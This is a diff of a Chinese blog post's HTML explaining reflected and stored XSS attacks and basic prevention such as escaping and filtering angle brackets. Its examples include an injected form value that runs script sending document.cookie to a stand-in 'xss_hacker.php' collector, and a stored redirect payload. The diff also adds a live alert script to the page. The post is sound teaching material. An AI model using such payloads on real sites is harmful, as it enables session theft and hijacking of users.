@@ -16,15 +16,16 @@
 <p>此时小A看到自己的网页代码变成了这样,顿时茅塞顿开，立马上网给女友买了一支口红表示感谢。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;小A的购物网站&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;form&gt;</span><br><span class="line">             &lt;input type=&quot;text&quot; name=&quot;address&quot; value=&quot;&quot;/&gt;&lt;script&gt;window.open(&quot;http://localhost/xss_hacker.php?cookie=&quot;+document.cookie);&lt;/script&gt;&lt;!--&quot;/&gt;</span><br><span class="line">             &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>上述案例就是XSS攻击（非持久型）。<br>存储型XSS（持久型）<br>存储型XSS也被称为持久型XSS（persistent XSS），这种类型的XSS攻击更常见，危害也更大。它和反射型XSS类似，不过会把攻击代码存储到数据库中，任何用户访问包含攻击代码的页面都会被殃及。</p>
+<p>上述案例就是XSS攻击（非持久型）。</p>
+<script>alert("这就是非持久型XSS攻击")</script>
+<p>存储型XSS（持久型）<br>存储型XSS也被称为持久型XSS（persistent XSS），这种类型的XSS攻击更常见，危害也更大。它和反射型XSS类似，不过会把攻击代码存储到数据库中，任何用户访问包含攻击代码的页面都会被殃及。</p>
 <p>比如，某个网站通过表单接收用户的留言，如果服务器接收数据后未经处理就存储到数据库中，那么用户可以在留言中出入任意javaScript代码。比如攻击者在留言中加入一行重定向代码：</p>
-<script>window.location.href=”http://localhost”;<script>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.location.href=”http://localhost”;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
-其他任意用户一旦访问关于这条留言的页面，包含这条留言的数据就会被浏览器解析，就会执行其中的javaScript脚本。那么这个用户所在页面就会被重定向到攻击者写入的站点。
-XSS的预防可以从多方面着手：
-1. 浏览器自身就可以识别简单的XSS攻击字符串，从而阻止简单的XSS攻击；
-2. 从根本上说，解决办法是消除网站的XSS漏洞，这就需要网站开发者运用转义安全符等手段；
-
-很多网站都是直接把< > 等字符过滤掉比如：
-![汽车之家的搜索](/images/xss.png)
-![汽车之家的搜索](/images/xs2.png)</div></article></div></main><footer><div class="paginator"><a href="/2021/07/12/%E5%93%8D%E5%BA%94%E4%BD%93%E9%87%8C%E7%9A%84%E5%BC%BA%E7%BC%93%E5%AD%98%E5%92%8C%E5%8D%8F%E5%95%86%E7%BC%93%E5%AD%98/" class="next">下一篇</a></div><div class="copyright"><p>© 2018 - 2021 <a href="https://www.doublekai.com">DOUBLEKAI</a></p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>
+<p>其他任意用户一旦访问关于这条留言的页面，包含这条留言的数据就会被浏览器解析，就会执行其中的javaScript脚本。那么这个用户所在页面就会被重定向到攻击者写入的站点。<br>XSS的预防可以从多方面着手：</p>
+<ol>
+<li>浏览器自身就可以识别简单的XSS攻击字符串，从而阻止简单的XSS攻击；</li>
+<li>从根本上说，解决办法是消除网站的XSS漏洞，这就需要网站开发者运用转义安全符等手段；</li>
+</ol>
+<p>很多网站都是直接把&lt; &gt; 等字符过滤掉比如：<br><img src="/images/xss.png" alt="汽车之家的搜索"><br><img src="/images/xs2.png" alt="汽车之家的搜索"></p>
+</div></article></div></main><footer><div class="paginator"><a href="/2021/07/12/%E5%93%8D%E5%BA%94%E4%BD%93%E9%87%8C%E7%9A%84%E5%BC%BA%E7%BC%93%E5%AD%98%E5%92%8C%E5%8D%8F%E5%95%86%E7%BC%93%E5%AD%98/" class="next">NEXT</a></div><div class="copyright"><p>© 2018 - 2021 <a href="https://www.doublekai.com">DOUBLEKAI</a></p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>
